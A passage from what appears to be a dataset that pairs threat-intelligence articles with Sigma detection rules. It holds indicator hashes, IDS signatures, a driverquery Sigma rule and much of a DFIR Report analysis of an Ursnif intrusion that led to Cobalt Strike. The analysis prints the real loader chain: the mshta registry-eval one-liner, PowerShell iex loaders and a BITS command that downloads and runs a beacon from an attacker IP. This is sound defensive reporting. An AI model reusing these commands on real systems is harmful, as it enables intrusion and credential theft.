0cf1448c694d692598f4f\n\nstilak64.rar\n8ea6ad3b1acb9e7b2e64d08411af3c9a\n7c04c4567b77981d0d97d8c2eb4ebd1a24053f48\ndfdfd0a339fe03549b2475811b106866d035954e9bc002f20b0f69e0f986838f\n\nvnc32.rar\n0c5862717f00f28473c39b9cba2953f4\n25832c23319fcfe92cde3d443cc731ac056a964a\n7ebd70819a79be55d4c92c66e74e90e3309ec977934920aee22cd8d922808c9d\n\nvnc64.rar\nce77f575cc4406b76c68475cb3693e14\n80fdc4712ae450cfa41a37a24ce0129eff469fb7\nf02dc60872f5a9c2fcc9beb05294b57ad8a4a9cef0161ebe008\n```\n\n## Detections\n\n### Network\n\nPotential Impacket wmiexec.py activity\n\n```\nET MALWARE Ursnif Variant CnC Beacon\nET MALWARE Ursnif Variant CnC Beacon - URI Struct M2 (_2F)\nET INFO HTTP Request to a *.top domain\nET DNS Query to a *.top domain - Likely Hostile\nET MALWARE Ursnif Variant CnC Data Exfil\nET INFO Dotted Quad Host RAR Request\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\nET POLICY RDP connection confirm\nET POLICY MS Remote Desktop Administrator Login Request\nET MALWARE Ursnif Variant CnC Beacon 3\nET MALWARE Ursnif Payload Request (cook32.rar)\nET MALWARE Ursnif Payload Request (cook64.rar)\nET INFO Splashtop Domain (splashtop .com) in TLS SNI\nET INFO Splashtop Domain in DNS Lookup (splashtop .com)\n```\n\n### Sigma\n\n- Driver Query Lookup\n- MSHTA Execution\n- NSLookup Local\n- System Time Lookup\n- Ursnif Loader\n- LOLBin Not From C Drive\n- Suspicious LOLBin Non-C Drive\n- WMIC ComputerSystem Recon\n- Suspicious Systeminfo\n- Cobalt Strike Pipe Created\n- Suspicious LSASS Access\n- WMICExec Default Filename\n- Impacket Lateralization\n- Splashtop Software\n- Splashtop Network\n- Get-ADComputer\n- Proxy UA Malware\n\n### Yara\n\n- ISFB Gozi Yara\n- DFIR Report Yara\n\n## MITRE\n\n```\nMshta - T1218.005\nVisual Basic - T1059.005\nCompile After Delivery - T1027.004\nBITS Jobs - T1197\nCredentials from Password Stores - T1555\nLSASS Memory - T1003.001\nSystem Information Discovery - T1082\nProcess Discovery - T1057\nDomain Trust Discovery - T1482\nMark-of-the-Web Bypass - T1553.005\nMalicious File - T1204.002\nSystem Time Discovery - T1124\nSystem Owner/User Discovery - T1033\nRemote System Discovery - T1018\nRemote Desktop Protocol - T1021.001\nWindows Management Instrumentation - T1047\nDomain Account - T1087.002\nProcess Injection - T1055\nAsynchronous Procedure Call - T1055.004\nRegistry Run Keys / Startup Folder - T1547.001\nRemote Access Software - T1219\nWeb Protocols - T1071.001\nLateral Tool Transfer - T1570\nExfiltration Over C2 Channel - T1041\n```",
    "sigma_rule": {
      "title": "Potential Recon Activity Using DriverQuery.EXE",
      "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
      "related": [
        {
          "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detect usage of the \"driverquery\" utility to perform reconnaissance on installed drivers",
      "references": [
        "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
        "https://www.vmray.com/cyber-security-blog/analyzing-ursnif-behavior-malware-sandbox/",
        "https://www.fireeye.com/blog/threat-research/2020/01/saigon-mysterious-ursnif-fork.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-19",
      "modified": "2023-09-29",
      "tags": [
        "attack.discovery"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "driverquery.exe"
          },
          {
            "OriginalFileName": "drvqry.exe"
          }
        ],
        "selection_parent": [
          {
            "ParentImage|endswith": [
              "\\cscript.exe",
              "\\mshta.exe",
              "\\regsvr32.exe",
              "\\rundll32.exe",
              "\\wscript.exe"
            ]
          },
          {
            "ParentImage|contains": [
              "\\AppData\\Local\\",
              "\\Users\\Public\\",
              "\\Windows\\Temp\\"
            ]
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate usage by some scripts might trigger this as well"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_driverquery_recon.yml",
    "id": "153"
  },
  {
    "url": "https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/",
    "markdown": "# Unwrapping Ursnifs Gifts\n\n**Categories:**\ncobaltstrike\nExfiltrate Data\nursnif\nwmiexec\n\n**Published on:**\nJanuary 9, 2023\n\nIn late August 2022, we investigated an incident involving Ursnif malware, which resulted in Cobalt Strike being deployed. This was followed by the threat actors moving laterally throughout the environment using an admin account.\n\nThe Ursnif malware family (also commonly referred to as Gozi or ISFB) is one of the oldest banking trojans still active today. It has an extensive past of code forks and evolutions that has led to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3, and most recently, LDR4.\n\nFor this report, we have referred to the malware as Ursnif for simplicity, however, we also recommend reading Mandiant’s article on LDR4.\n\n## The DFIR Report Services\n\n- **Private Threat Briefs:** Over 20 private reports annually, such as this one but more concise and quickly published post-intrusion.\n- **Threat Feed:** Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.\n- **All Intel:** Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.\n- **Private Sigma Ruleset:** Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&CK with test examples.\n- **DFIR Labs:** Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.\n\nContact us today for a demo!\n\n## Case Summary\n\nIn this intrusion, a malicious ISO file was delivered to a user which contained Ursnif malware. The malware displayed an interesting execution flow, which included using a renamed copy of rundll32. Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as IcedID. The malware also established persistence on the host with the creation of a registry run key.\n\nApproximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard). The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions.\n\nThe threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping. Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials.\n\nUsing the credentials extracted from memory, the threat actors began to move laterally. They targeted a domain controller and used Impacket’s wmiexec.py to execute code on the remote host. This included executing both an MSI installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon. These files were transferred to the domain controller over SMB.\n\nAfter connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller. Finally, they dropped a script named `adcomp.bat` which executed a PowerShell command to collect data on computers in the Windows domain.\n\nThe following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day. At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller. From there, the threat actor began connecting to various hosts across the network.\n\nOne host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session. The threat actor was later evicted from the network.\n\n## Timeline\n\n```image\nAlt: Unwrapping Ursnifs Gifts Timeline\nDescription: The image is a detailed timeline diagram titled \"Unwrapping Ursnifs Gifts\" that depicts a chronological sequence of events related to a cyber threat intelligence case involving the Ursnif malware. It outlines various activities occurring over six days, including initial access, credential discovery, command and control activities, and other actions taken by the attackers. Each entry provides specific timestamps (UTC), commands executed, and the context of actions like process injections, lateral movements, and credential harvesting, making it a valuable resource for understanding the attack's progression.\nTranscription: |\n  Unwrapping Ursnifs Gifts\n  \n  Day 1\n  - 11:33 UTC Initial Access\n    - HPG\\Mounted\\C:\\Users\\REDACHTED\\Downloads\\1884849\n  - 11:34 UTC Ursnif Discovery\n    - cmd /c \"net user\" > C:\\Users\\REDACHTED\\AppData\\Local\\Temp\\user.txt\n    - cmd /c \"query process\" > C:\\Users\\REDACHTED\\AppData\\Local\\Temp\\process.txt\n    - cmd /c \"whoami\" > C:\\Users\\REDACHTED\\AppData\\Local\\Temp\\whoami.txt\n  - 11:39 UTC Process Injection and Command and Control\n    - Injected Process explorer.exe\n    - Explorer.exe\n    - [IP: 93.90.19.186]\n  - 11:41 UTC Command and Control and Persistence\n    - Registry Run Key\n    - HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{random string}\n    - [IP: 209.85.175.206]\n  \n  Day 4\n  - 09:04 UTC Discovery\n    - lhturn\n    - lhturn.exe\n  - 09:08 UTC Cobalt Strike Discovery\n    - cmd.exe /K user <REDACHTED>\n    - C:\\Windows\\system32\\cmd.exe /c net\n    - C:\\Windows\\system32\\cmd.exe /c powershell\n  - 09:18 UTC Credential Access on Beachhead\n    - Process Create: ApplicationFrameHost.exe\n    - [gathering source: 411]\n    - C:\\Windows\\system32\\cmd.exe /c whoami\n  - 09:24 UTC Command and Control and Persistence\n    - Alerts are forwarding enabled\n    - C:\\Windows\\system32\\spool\\drivers\\w32x86\\{random string}.exe\n    - process.exe access failed\n  - 10:38 UTC DC Discovery and Credential Access\n    - C:\\Windows\\system32\\cmd.exe /c page -domain:domain\n    - C:\\Windows\\system32\\{random string}.exe\n  \n  Day 5\n  - 09:04 UTC Discovery\n    - lhturn\n    - lhturn.exe\n  - 09:08 UTC Cobalt Strike Discovery\n    - cmd.exe /K user <REDACHTED>\n    - C:\\Windows\\system32\\cmd.exe /c net\n    - C:\\Windows\\system32\\cmd.exe /c powershell\n  - 09:21 UTC Lateral Movement to Domain Controller\n    - [ip: 192.168.1.1]\n    - C:\\Windows\\system32\\spool\\drivers\\w32x86\\{random string}.exe\n  - 09:27 UTC Lateral Movement and Command and Control\n    - Cobalt Strike executable transferred via SMB\n    - C:\\ProgramData\\{random string}\n    - [IP: 93.90.19.186]\n  \n  Day 6\n  - 10:32 UTC Discovery on Beachhead\n    - C:\\ProgramData\\{random string}\n  - 23:39 Discovery from Domain Controller\n    - Cobalt Strike EDR Proxy\n    - C:\\ProgramData\\{random string}\n    - Local host IP: 192.168.1.1 | Local host IP: 3399\n    - Domain Controller IP: Various hosts 1399\n    - C:\\Windows\\system32\\{random string}.exe\n  - 00:04 UTC Lateral Movement to Backup Server\n    - EDR logs from Domain Controller\n    - C:\\Windows\\system32\\{random string}.exe\n    - C:\\Windows\\system32\\{random string}.exe\n```\n\n## Initial Access\n\nIn this case, the Ursnif malware was delivered using a very familiar technique of being contained within an ISO file.\n\nThe DFIR Report has previously reported on several incidents that involved the tactic of delivering malicious files using ISO files:\n\n- Quantum Ransomware\n- BumbleBee Roasts Its Way to Domain Admin\n- BumbleBee: Round Two\n- Diavol Ransomware\n\nAs we have previously highlighted, the Event Log `Microsoft-Windows-VHDMP-Operational.evtx` contains high confidence evidence when users mount ISO files. We recommend looking for these events (especially Event ID’s 1, 12 & 25) in your environment and checking for anomalies.\n\nIn this case, the user had saved the file `3488164.iso` to their downloads folder and mounted it.\n\n```image\nAlt: ISO File Mount\nDescription: The image displays a screenshot of Windows Event Viewer, specifically showing the operational log for 'Microsoft-Windows-VHDMP-Operational'. It lists several events related to the mounting of a Virtual Hard Disk (VHD), indicating that the ISO file '3488164.iso' was mounted. The screenshot includes details such as event levels, dates and times, event IDs (notably Event ID 1), and task categories, which are relevant for identifying suspicious activity related to malware delivery.\nTranscription: |\n  Microsoft-Windows-VHDMP-Operational\n  Number of events: 13\n  \n  | Level       | Date and Time | Source | Event ID | Task Category              |\n  | ----------- | ------------- | ------ | -------- | -------------------------- |\n  | Information |               | VHDMP  | 14       | Virtual Disk Handle Close  |\n  | Information |               | VHDMP  | 30       | Virtual Disk Handle Close  |\n  | Information |               | VHDMP  | 1        | Surface Virtual Disk       |\n  | Information |               | VHDMP  | 25       | Surface Virtual Disk       |\n  | Information |               | VHDMP  | 12       | Virtual Disk Handle Create |\n  | Information |               | VHDMP  | 22       | Filewrapper Handle Create  |\n  | Information |               | VHDMP  | 23       | Filewrapper Handle Create  |\n  \n  Event 1, VHDMP\n  \n  General\n  Details\n  The VHD C:\\Users\\<redacted>\\Downloads\\3488164.iso has come online (surfaced) as disk number 0.\n```\n\nOnce mounted, the new drive contained a LNK file `6570872.lnk` and hidden folder “me”.\n\n```image\nAlt: LNK File\nDescription: The image shows the properties of a Windows shortcut file named '6570872.lnk' located in a mounted ISO file under the folder 'me'. It displays details such as the target type (Windows Batch File), target location pointing to 'me\\alsoOne.bat', and additional metadata like 'Date modified' and 'Type'. This context indicates the potential malicious use of the shortcut file to execute a batch script associated with the Ursnif malware.\nTranscription: |\n  | Name    | Type        | Size | Date modified |\n  | ------- | ----------- | ---- | ------------- |\n  | me      | File folder | -    | -             |\n  | 6570872 | Shortcut    | 2 KB | -             |\n  \n  **Shortcut Properties:**\n  - **Target type:** Windows Batch File\n  - **Target location:** me\n  - **Target:** E:\\me\\alsoOne.bat\n  - **Start in:**\n  - **Shortcut key:** None\n```\n\nIf we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as:\n\n```image\nAlt: LECmd Output\nDescription: The image displays a terminal output from a forensic analysis tool, showing details about a LNK file named '6570872.lnk'. It includes metadata such as source creation, modification times, and the relative path to a batch file 'alsoOne.bat'. The header section lists various flags indicating the file's properties and attributes. This output is significant for understanding how the LNK file operates in the context of the Ursnif malware execution process.\nTranscription: |\n  Source file: \\6570872.lnk\n  Source created: 09:29:59\n  Source modified: 12:45:46\n  Source accessed: 01:26:41\n  \n  --- Header ---\n  Target created: null\n  Target modified: null\n  Target accessed: null\n  \n  File size: 0\n  Flags: HasTargetIdList, HasRelativePath, HasIconLocation, IsUnicode, HasExpIcon\n  File attributes: 0\n  Icon index: 0\n  Show window: SwShowmininactive (Display the window as minimized without activating it.)\n  \n  Relative Path: ..\\..\\..\\me\\alsoOne.bat\n  Icon Location: c:\\windows\\explorer.exe\n```\n\nThe contents of hidden folder “me”, included several files and folders that were used for the execution of Ursnif. Of interest, the folder included a legitimate copy of `rundll32.exe` (renamed to `123.com`).\n\n```image\nAlt: Hidden Folder Contents\nDescription: The image displays the contents of a directory labeled 'me' on a DVD drive, showcasing various files and folders associated with the Ursnif malware. The directory includes two empty folders ('by' and 'here'), a renamed executable ('123.com'), a Windows batch file ('alsoOne.bat'), a JavaScript file ('canWell.js'), a database file ('itslt.db'), and a JPEG image ('or.jpg'). The file types and sizes are listed, indicating the purpose and potential functionality of these files in relation to the malware execution.\nTranscription: |\n  DVD Drive (E:) CD_ROM \\ me \\\n  ---------------------------------------------------------------\n  | Name        | Date modified | Type                  | Size   |\n  | ----------- | ------------- | --------------------- | ------ |\n  | by          | 2022          | File folder           |        |\n  | here        | 2022          | File folder           |        |\n  | 123.com     | 2022          | MS-DOS Application... | 61 KB  |\n  | alsoOne.bat | 2022          | Windows Batch File    | 1 KB   |\n  | canWell.js  | 2022          | JavaScript File       | 1 KB   |\n  | itslt.db    | 2022          | Data Base File        | 351 KB |\n  | or.jpg      | 2022          | JPEG image            | 78 KB  |\n  ---------------------------------------------------------------\n```\n\nSummary of the files found in `3488164.iso` (a detailed breakdown of these can be found in **Execution**):\n\n| File Name      | Purpose                                                     |\n| -------------- | ----------------------------------------------------------- |\n| 6570872.lnk    | LNK file that executes alsoOne.bat                          |\n| me/by          | Empty folder                                                |\n| me/here        | Empty folder                                                |\n| me/123.com     | Renamed legitimate version of rundll32.exe                  |\n| me/alsoOne.bat | Batch script to run canWell.js with arguments               |\n| me/canWell.js  | Reverses argument strings and executes tslt.db with 123.com |\n| me/itslt.db    | Ursnif DLL                                                  |\n| or.jpg         | Image not used                                              |\n\n## Execution\n\nOnce the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.\n\n```image\nAlt: Execution Flow\nDescription: The image depicts a detailed execution flow related to the Ursnif malware. It outlines the sequence of processes initiated after a user mounts an ISO file and executes a LNK file. The flowchart illustrates various components, including 'Explorer.exe,' 'mshta.exe,' and 'powershell.exe,' along with their interactions and the execution of scripts and commands. Key actions include file creation, persistence mechanisms, and discovery commands executed via the command line. The diagram is structured with arrows indicating the flow of execution and includes annotations for clarity.\nTranscription: |\n  Unwrapping Ursnifs Gifts - Execution Flow\n  \n  Execution Chain\n  1. Explorer.exe\n     - ISO mounted by user\n     - `.LNK` file clicked by user\n     - Batch script `alsoOne.bat` executed\n     - `Wscript.exe` executes `canWell.js`\n     - `123.com` (using `rundll32`) executes `Gozi.dll`\n     - `internetcocal[.]in` (superstarts[.]top)\n  \n  2. Mshta.exe Execution\n     - `mshta.exe` used to launch `ActiveXObject()`\n     - Spawns `powershell.exe`\n     - Powershell Execution in Registry**:\n       - `HKCU\\Software\\AppDataLow\\Software\\Microsoft\\<GUID>\\ <KEYWORD1>`\n       - `HKCU\\Software\\AppDataLow\\Software\\Microsoft\\<GUID>\\ <KEYWORD2>`\n  \n  3. Process Access & Create Remote Thread\n     - `csc.exe` (C# Compiler) - Dynamic Compilation\n  \n  4. 32-bit `cmd.exe` Execution\n  \n  ---\n  \n  Persistence\n  - File Creation:\n    - `C:\\Users\\<USERNAME>\\<KEYWORD1>.lnk` (Points to `powershell.exe`)\n    - `C:\\Users\\<USERNAME>\\<KEYWORD2>.ps1`\n  - Registry Key for Execution:\n    - User `Run` key created to execute `<KEYWORD1>.lnk` with `<KEYWORD2>.ps1`\n  \n  ---\n  \n  Discovery Commands\n  Executed via `cmd.exe`:\n  - `wmic computersystem get domain`\n  - `systeminfo.exe`\n  - `cmd /C net view`\n  - `cmd /C nslookup 127.0.0.1`\n  - `tasklist.exe /SVC`\n  - `driverquery.exe`\n  - `cmd /C reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s`\n  - `cmd /C net config workstation`\n  - `cmd /C nltest /domain_trusts`\n  - `cmd /C nltest /domain_trusts /all_trusts`\n  - `cmd /C net view /all /domain`\n  - `cmd /C net use`\n  \n  Staging of Output:\n  - Standard output of discovery commands is redirected to a staging file:\n    - `C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\BD2C.bin`\n```\n\n### Ursnif Malware\n\nHighlighted in **Initial Access**, the LNK file would execute a batch script `alsoOne.bat`. This script called a JavaScript file `canWell.js` in the same directory and provided a number of strings as arguments.\n\n```\nalsoOne.bat\n```\n\n```\nset %params%=hello\nme\\canWell.js hello cexe lldnur revreSretsigeRllD\n```\n\n```\ncanWell.js\n```\n\n```\n/**\n\tWhnldGh\n*/\nfunction reverseString(str)\n{\n\tvar splitString = str.split(\"\");\n\tvar reverseArray = splitString.reverse();\n\tvar joinArray = reverseArray.join(\"\");\n\treturn joinArray;\n}\nfunction ar(id)\n{\n\tr = WScript.Arguments(id);\n\treturn r;\n}\nvar sh = WScript.CreateObject(\"WScript.Shell\");\nsh[reverseString(ar(1))](\"me\\\\123.com me/itsIt.db,\"+reverseString(a\n```\n\nThe JS file was then executed with `wscript.exe` and used the provided command line arguments, which created and executed the following command using `WScript.Shell.Exec()`:\n\n```image\nAlt: WScript Execution\nDescription: The image illustrates the execution flow related to Gozi malware, showing the relationship between components involved in the malware's operation. It highlights the renamed copy of 'rundll32.exe' supplied in an ISO as '123.com', which is used to register the Gozi malware DLL. The diagram includes arrows pointing to key elements: the Gozi malware DLL, the entry function 'DllRegisterServer', and the source of the renamed executable. The background is dark, and the text is color-coded for clarity.\nTranscription: |\n  Gozi malware DLL\n          ↑\n  me/123.com me/itsIt.db,DllRegisterServer\n          ↓\n  Copy of rundll32.exe supplied in ISO renamed to 123.com\n          ↑\n  Entry Function to register DLL\n```\n\n```\nme/123.com me/itsIt.db,DllRegisterServer\n```\n\nUsing the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data.\n\n```image\nAlt: SRUM Data\nDescription: The image is a screenshot of a data table from a cybersecurity analysis tool. It contains columns labeled 'Timestamp', 'Exe Info', 'Sid Type', 'Sid', 'User Name', 'Bytes Received', 'Bytes Sent', 'Interface Luid', and 'Interface Type'. The table details a specific execution related to the Ursnif malware, with a highlighted entry showing the execution information for a command related to a URL and associated network activity, including bytes received and sent.\nTranscription: |\n  | Timestamp | Exe Info                  | Sid Type         | Sid         | User Name | Bytes Received | Bytes Sent | Interface Luid   | Interface Type           |\n  | --------- | ------------------------- | ---------------- | ----------- | --------- | -------------- | ---------- | ---------------- | ------------------------ |\n  |           | \\device\\cdrom0\\me\\123.com | UnknownOrUserSid | S-1-5-21... |           | 435520         | 21349      | 1689399632855040 | IF_TYPE_ETHERNET_CS MACD |\n```\n\nOnce the malware was executed, the parent instance of explorer launched MSHTA with the following command:\n\n```\n\"C:\\Windows\\System32\\mshta.exe\" \"about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Cxak).regread('HKCU\\\\\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\472A62F9-FA62-1196-3C6B-CED530CFE2D9\\\\\\ActiveDevice'));if(!window.flag)close()</script>\"\n```\n\nThis oneliner created a new ActiveX object to eval() the content stored in the registry key in the users registry hive. The content of the value “ActiveDevice”:\n\n```image\nAlt: Registry Key\nDescription: The image shows a detailed view of registry values related to the Ursnif malware's execution. It includes various registry entries like 'NameActive', 'MemoryJunk', and 'ActiveDevice', along with their types and corresponding binary data. The highlighted 'ActiveDevice' entry contains a PowerShell command that creates aliases for PowerShell commands, demonstrating the malware's behavior in manipulating system settings. This data is crucial for understanding the malware's operation and its effects on the system.\nTranscription: |\n  | Value Name      | Value Type | Data                                                                                                      |\n  | --------------- | ---------- | --------------------------------------------------------------------------------------------------------- |\n  | NameActive      | RegSZ      | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-3D-B1-A5-70-FF-8F-5B-3D-3D-...                                              |\n  | DocumentCheck   | RegSZ      | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-70-FF-8F-5B-3D-3D-...                                                       |\n  | MemoryJunk      | RegBinary  | 24-78-71-68-6F-67-22-6D-6E-68-66-76-6F-72-6D-6F-6E-6F-6E-...                                              |\n  | ActiveDevice    | RegSZ      | Ahgvof=new ActiveXObject('WScript.Shell');Ahgvof.Run('powershell new-alias -name qirlbtfhgo -value gp;... |\n  | ManagerText     | RegSZ      | mshta \"about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Cxak)...  |\n  | BlackActive     | RegBinary  | {929B70B6-C9D1-9480-E3E6-00B0C779A1BC}                                                                    |\n  | UltTime         | RegQWord   | 3952832347                                                                                                |\n  | DriverCollision | RegSZ      | 35-F9-ED-6F-89-3D-20-7A-C7-A7-49-CC-6E-94-FB-E9-...                                                       |\n```\n\nThe payload used another ActiveX object to run a PowerShell command. This command created additional aliases of common default PowerShell aliases `gp` (Get-ItemProperty) and `iex` (Invoke-Expression). These two new aliases were used to get and execute the content in another registry value “MemoryJunk”:\n\n```\nAhgvof=new ActiveXObject('WScript.Shell');Ahgvof.Run('powershell new-alias -name qirlbtfhgo -value gp; new-alias -name kvikpt -value iex; kvikpt ([System.Text.Encoding]::ASCII.GetString((qirlbtfhgo \"HKCU:\\Software\\\\AppDataLow\\\\Software\\\\Microsoft\\\\472A62F9-FA62-1196-3C6B-CED530CFE2D9\").MemoryJunk))',0,0);\n```\n\n*Analyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution.*\n\nThe last registry key was used to store additional PowerShell code. This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64.\n\n```image\nAlt: PowerShell Code\nDescription: The image displays a data table likely from a registry viewer, showing various registry values associated with a malware analysis. Each row includes a 'Value Name', 'Value Type', and 'Data', with entries such as 'MemoryJunk', 'ActiveDevice', and others. The data in these registry entries appears to include binary values, script commands, and other encoded information related to the Ursnif malware execution. Additionally, there is a hex view of the data at the bottom, showing its binary representation.\nTranscription: |\n  | Value Name                             | Value Type | Data                                                                         |\n  | -------------------------------------- | ---------- | ---------------------------------------------------------------------------- |\n  | NameActive                             | RegBinary  | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-99-3D-B1-A5-70-FF-5F-5B-98-3D-...              |\n  | DocumentCheck                          | RegBinary  | D5-5A-99-3D-B6-A5-6F-FF-D6-5A-99-3D-B1-A5-70-FF-5F-5B-98-3D-...              |\n  | MemoryJunk                             | RegBinary  | 24-78-71-68-61-6F-77-79-32-26-68-22-36-22-36-...                             |\n  | ActiveDevice                           | RegSz      | Ahgvof=new ActiveXObject(\"WScript.Shell\");Ahgvof.Run('powershell...          |\n  | ManagerText                            | RegSz      | mshta \"about:<hta:application><script>Cxak='wscript.shell';resizeTo(0,2);... |\n  | BlackActive                            | RegBinary  | B8-08-00-00-3C-31-80-00-9A-56-A3-DB-1DB-02-17-3C-6B-CE-D5-...                |\n  | {92978D76-C9D1-940B-E36-0D0BC777A19C}  | RegBinary  | 70-95-95-3E-5F-3B-8D-01                                                      |\n  | {E89E9406-4EA7-586B-B04F-6259E4F386D9} | RegBinary  | 4C-4C-76-5A-87-BD-8-01                                                       |\n  | UtiTime                                | RegQword   | 2953982374                                                                   |\n  | DriverCollision                        | RegBinary  | 35-F9-6E-6F-89-CE-00-27-CA-A7-4F-39-CC-54-AF-B8-FE-B9-...                    |\n  \n  Type viewer:\n  00000000  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |................|\n  00000010  10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |................|\n  00000020  20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F 30  | !\"#$%&'()*+,-./0|\n  00000030  31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F 40 41  |123456789:;<=>?@A|\n  00000040  42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52  |BCDEFGHIJKLMNOPQR|\n  00000050  53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F 60 61 62 63  |STUVWXYZ[\\]^_`abc|\n  00000060  64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74  |defghijklmnopqrstu|\n  00000070  75 76 77 78 79 7A 7B 7C 7D 7E 7F 80 81 82 83 84 85  |uvwxyz{|}~........|\n```\n\n```image\nAlt: PowerShell Code\nDescription: The image displays a code output from a programming environment or debugger. It contains a C# code snippet that imports functions from the 'kernel32.dll' library, specifically for process management. The functions listed include 'QueueUserAPC', 'GetCurrentThread', 'OpenThread', and 'GetCurrentProcess'. The code is formatted in a way that suggests it is part of a larger script or application, with details on function definitions and parameters.\nTranscription: $horjee=[DllImport(\"kernel32\")]public static extern uint QueueUserAPC(IntPtr hstksfrkue,IntPtr nxcjsjshatc,IntPtr oryck);n[DllImport(\"kernel32\")]public static extern IntPtr GetCurrentThread();n[DllImport(\"kernel32\")]public static extern IntPtr OpenThread(uint icv,uint tulhsch,IntPtr rubl);$ulaylmq=Add-Type -MemberDefinition $horjee -Name 'eyoliuidump' -namespace W32 -passthru;$crgy=\"n[DllImport(\"kernel32\")]public static extern IntPtr GetCurrentProcess\";n[DllImport(\"kernel32\")]public static extern void\n```\n\nWhen Add-Type cmdlet is executed, the C# compiler csc.exe is invoked by PowerShell to compile this class definition, which results in the creation of temporary files in %APPDATA%\\Local\\Temp.\n\n```\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\npfdesjp\\npfdesjp.cmdline\"\n```\n\nFinally, a unique command spawned from the parent explorer.exe process that was called pause.exe with multiple arguments, which appeared to not provide any additional functionality.\n\n```\n\"C:\\Windows\\syswow64\\cmd.exe\" /C pause dll mail, ,\n```\n\n*A sigma rule for this cmdline can be found in the **Detections** section of this report.*\n\nAt this point in time, less than a minute of time has elapsed since the user first opened the malware.\n\nOnce the malware was established on the host, there was limited malicious activity, until around 3 days later. That is when we began to observe evidence indicative of “hands-on-keyboard” activity.\n\n### Cobalt Strike\n\nAn instance of cmd.exe was launched through explorer.exe which ran the following command:\n\n```\npowershell.exe  -nop -c \"start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'hxxp://193.201.9.199:80/a’ -Destination $d; $t = [IO.File]::ReadAllText($d); Remove-Item $d; IEX $t } -Argument 0 | wait-job | Receive-Job\"\n```\n\n*Analyst Note: Ursnif has been known to have VNC-like capabilities. It is possible this explorer.exe ➝ cmd.exe session was through a VNC session.*\n\nThis PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%. It then read the file into a variable, and deleted it before executing content with `IEX`.\n\nThe event log `Microsoft-Windows-Bits-Client%254Operational.evtx` corroborated this activity:\n\n```image\nAlt: BITS Job\nDescription: The image displays a screenshot of an event log from the Microsoft BITS (Background Intelligent Transfer Service) client. It shows several log entries with various event IDs, including an event marked with ID 59, which indicates that a BITS transfer job was started associated with a specific URL (http://193.201.9.199:80/a). The log contains details categorized as 'Verbose', 'Information', and 'Warning', illustrating different levels of logging for BITS activities.\nTranscription: |\n  Event 59, Bits-Client\n  \n  General\n  BITS started the BITS Transfer transfer job that is associated with the http://193.201.9.199:80/a URL.\n  \n  Details\n  Verbose      Bits-Client  306  None\n  Information  Bits-Client  60   None\n  Information  Bits-Client  59   None\n  Warning      Bits-Client  310  None\n  Information  Bits-Client  16403 None\n  Information  Bits-Client  3    None\n  Information  Bits-Client  206  None\n```\n\nThe activity following this event demonstrated a clear distinction of the threat actor performing discovery manually.\n\n## 